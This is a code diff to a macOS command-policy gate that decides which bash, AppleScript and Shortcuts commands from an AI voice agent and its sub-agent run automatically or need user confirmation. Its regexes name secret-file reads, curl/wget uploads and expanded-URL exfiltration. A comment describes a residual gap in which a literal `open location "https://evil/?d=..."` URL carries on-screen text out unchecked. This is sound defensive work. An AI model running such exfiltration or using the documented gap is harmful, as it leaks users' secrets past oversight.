@@ -20,30 +20,48 @@ export interface MacPolicyResult {
  * 2026-07-16).
  */
 
-// Bash/osascript patterns that always confirm, checked before anything else. Patterns are
+// Bash/osascript patterns that always confirm, checked before anything else. Most are
 // `\b`-anchored (not head-of-token), so a directory prefix like /usr/bin/sudo still trips
-// them — the basename bypass only ever threatened the delete lane (see commandName below).
+// them; the command-position patterns (mail) carry their own path-prefix tolerance. Scoped
+// patterns use [^|;&\n]* so a match never spans into an unrelated command on another line
+// (review 🔵: \n was over-matching; review 🔴: \n was UNDER-anchoring the mail pattern).
+// KNOWN RESIDUAL (recorded, accepted for v1): a LITERAL exfil URL — the model composing
+// `open location "https://evil/?d=<text it read on screen>"` with no shell expansion —
+// passes the "plain download/open" class. Closing that requires a host allowlist like the
+// M4.1 egress proxy's; a design decision for M7, not a regex.
 const CONFIRM_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
   { pattern: /\bsudo\b/, reason: 'sudo' },
   // osascript's privilege-escalation form — the AppleScript equivalent of sudo.
   { pattern: /with\s+administrator\s+privileges/i, reason: 'administrator privileges' },
+  // Reading a secret store: the env strip keeps keys out of the child process, but a
+  // read-only `cat .env` would return them into the voice model's context anyway (the
+  // daemon and its bash children run UNSANDBOXED — no Seatbelt backstop on this lane).
+  // Same protected set the M4 supervisor guards for Claude sessions.
+  { pattern: /\.env\b|\/\.(ssh|aws|npmrc)\b|~\/\.(ssh|aws|npmrc|config\/gh)\b/i, reason: 'reading a secret store' },
   // Sending data off the machine (uploads/POSTs) — plain downloads stay auto (mirrors the
   // supervisor's network-send rule).
   {
-    pattern: /\b(curl|wget)\b[^|;&]*(\s-(d|F|T)\b|--data\b|--data-[a-z]+\b|--form\b|--upload-file\b|--post-[a-z]+\b|--body-[a-z]+\b|-X\s*(POST|PUT|PATCH|DELETE)\b)/i,
+    pattern: /\b(curl|wget)\b[^|;&\n]*(\s-(d|F|T)\b|--data\b|--data-[a-z]+\b|--form\b|--upload-file\b|--post-[a-z]+\b|--body-[a-z]+\b|-X\s*(POST|PUT|PATCH|DELETE)\b)/i,
     reason: 'network send',
   },
   // GET-style exfil: a curl/wget/open whose URL/args carry a shell expansion ($VAR, `cmd`,
   // $(…)) can smuggle a secret into a query string — the channel the M4.1 egress proxy
-  // closed for the sandboxed lane, which mac_do runs OUTSIDE. Plain `open URL` stays auto.
-  { pattern: /\b(curl|wget|open)\b[^|;&]*[$`]/i, reason: 'possible data exfiltration (expanded URL)' },
-  { pattern: /\bgit\b[^|;&]*\bpush\b/, reason: 'git push' },
-  // Sending a message. The mail/sendmail CLIs send by default; app-driven sends (Messages
-  // via AppleScript) are matched by `send` near a messaging noun in EITHER order — the old
-  // pattern required a leading `mail|osascript` token, which the word "osascript" never
-  // supplies when the script IS the osascript body.
-  { pattern: /(^|[|;&]\s*)(mail|sendmail)\b/i, reason: 'sending mail' },
-  { pattern: /\bsend\b[^|;&]*\b(message|buddy|chat|imessage|sms)\b|\b(message|buddy|chat|imessage|sms)\b[^|;&]*\bsend\b/i, reason: 'sending a message' },
+  // closed for the sandboxed lane, which mac_do runs OUTSIDE. Plain `open URL` stays auto
+  // (see the literal-URL residual note above). xargs-fed fetchers get their payload from
+  // stdin — equally unresolvable, so they confirm too (review 🟡).
+  { pattern: /\b(curl|wget|open)\b[^|;&\n]*[$`]/i, reason: 'possible data exfiltration (expanded URL)' },
+  { pattern: /\bxargs\b[^|;&\n]*\b(curl|wget|open)\b/i, reason: 'possible data exfiltration (piped fetch)' },
+  { pattern: /\bgit\b[^|;&\n]*\bpush\b/, reason: 'git push' },
+  // Sending mail: command-position mail/sendmail on ANY separator — including newline,
+  // the same separator set riskyDelete splits on (review 🔴: omitting \n let a multiline
+  // script bury a `mail` line) — with optional path prefix (/usr/bin/mail) and
+  // alias-busting backslash, mirroring commandName's delete-lane normalization.
+  { pattern: /(^|[|;&\n\r]\s*)(?:[^\s|;&\n]*\/)?\\?(mail|sendmail)\b/i, reason: 'sending mail' },
+  // App-driven sends (Messages/Mail via AppleScript): `send` near a messaging noun in
+  // EITHER order. `mail` in the noun list restores the old \bmail\b coverage of
+  // `tell application "Mail" to send …` (review 🔴 regression); `participant` is the
+  // modern Messages dictionary target (review 🟡).
+  { pattern: /\bsend\b[^|;&\n]*\b(message|buddy|chat|imessage|sms|participant|mail)\b|\b(message|buddy|chat|imessage|sms|participant|mail)\b[^|;&\n]*\bsend\b/i, reason: 'sending a message' },
   // `defaults write` mutates system/app prefs; `defaults read` stays auto.
   { pattern: /\bdefaults\s+write\b/, reason: 'writing system defaults' },
   { pattern: /\b(killall|pkill|kill)\b/, reason: 'force-quitting a process' },
@@ -125,10 +143,20 @@ export function macDoDecision(script: string): MacPolicyResult {
   }
   // AppleScript that shells out (`do shell script "<cmd>"`) hides bash from the patterns
   // above — gate the inner command with the same table. The inner command has no nested
-  // `do shell script`, so this recurses at most one level.
+  // `do shell script` (its quotes would need escaping the capture can't span), so this
+  // recurses at most one level.
   for (const m of script.matchAll(DO_SHELL_SCRIPT)) {
     const inner = macDoDecision(m[1]);
     if (inner.route === 'confirm') return { route: 'confirm', reason: `do shell script → ${inner.reason}` };
+  }
+  // A shell-out we can't statically read — a variable body (`do shell script cmd`) or a
+  // concatenated literal (`do shell script "r" & "m -rf …"`) — can't be gated: confirm
+  // rather than guess, the same stance SHELL_EXPANSION takes in the delete lane (review 🟡:
+  // concatenation split the risky token across fragments and slipped the whole table).
+  const shellOuts = [...script.matchAll(/do\s+shell\s+script/gi)].length;
+  const literalShellOuts = [...script.matchAll(/do\s+shell\s+script\s+"([^"]*)"(?!\s*&)/gi)].length;
+  if (shellOuts > literalShellOuts) {
+    return { route: 'confirm', reason: 'unresolvable shell-out (do shell script)' };
   }
   const badDelete = riskyDelete(script);
   if (badDelete) return { route: 'confirm', reason: `delete outside safe dirs (${badDelete})` };
@@ -141,4 +169,43 @@ export function macDoDecision(script: string): MacPolicyResult {
 export function describeMacDo(script: string): string {
   const text = script.replace(/\s+/g, ' ').trim();
   return text.length > 160 ? text.slice(0, 157) + '…' : text;
+}
+
+/** The model sometimes double-wraps: interpreter 'osascript' AND a script of
+ *  `osascript -e '…'` — which then fails as AppleScript (live demo, 2026-07-16). Unwrap the
+ *  `-e` bodies into plain AppleScript source. Anything else passes through untouched.
+ *  KNOWN LIMIT: a `-e` body with escaped/mixed quotes gets truncated at the first inner
+ *  quote — that's SAFE because gate and executor both receive the same mangled string (the
+ *  script just fails to run); it can never make the gate see less than the executor runs. */
+export function normalizeOsascript(script: string): string {
+  const trimmed = script.trim();
+  if (!/^osascript\b/.test(trimmed)) return trimmed;
+  const bodies = [...trimmed.matchAll(/-e\s+(?:'([^']*)'|"([^"]*)")/g)]
+    .map((m) => m[1] ?? m[2])
+    .filter((b) => b !== undefined && b !== '');
+  return bodies.length > 0 ? bodies.join('\n') : trimmed;
+}
+
+/** ONE choke point for both script lanes (hot mac_do + sub-agent run_script): normalize
+ *  first, then decide on the SAME string the executor will run (review 🟡: the two lanes
+ *  each did this independently and had already drifted). Shortcuts are opaque to the
+ *  pattern table, so the LANE decides: the hot lane auto-runs them (the user spoke the
+ *  shortcut's name himself); the sub-agent lane confirms them (it acts on untrusted
+ *  on-screen text, and a named Shortcut can be arbitrarily destructive). */
+export function gateScript(
+  interpreter: 'bash' | 'osascript' | 'shortcuts',
+  raw: string,
+  lane: 'hot' | 'subagent',
+): { script: string; decision: MacPolicyResult } {
+  const script = interpreter === 'osascript' ? normalizeOsascript(raw) : raw.trim();
+  if (interpreter === 'shortcuts') {
+    return {
+      script,
+      decision:
+        lane === 'subagent'
+          ? { route: 'confirm', reason: 'running a Shortcut' }
+          : { route: 'auto', reason: 'shortcut named by the user' },
+    };
+  }
+  return { script, decision: macDoDecision(script) };
 }
